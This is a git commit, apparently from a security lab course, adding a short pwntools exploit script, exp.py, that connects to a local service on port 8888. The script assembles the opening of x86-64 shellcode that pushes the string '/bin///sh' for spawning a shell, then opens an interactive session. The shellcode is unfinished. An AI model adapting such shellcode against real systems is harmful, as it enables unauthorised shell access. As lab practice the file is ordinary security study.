d2f11c42e9bac97aa9f925be92bbe3f502a8a52b
Yasheed1995 <qwerty8608301@gmail.com>
2018-10-01 15:45:37 +0800

    regular

---
+++ Lab_1/Lab1-2/exp.py
@@ -0,0 +1,16 @@
+from pwn import *
+from IPython import embed
+
+context.arch = 'amd64'
+
+r = remote('127.0.0.1', 8888)
+
+a = asm("""
+        push 0x68
+        mov rax, 0x732f2f2f6e69622f
+        push rax
+        """)
+
+embed()
+
+r.interactive()
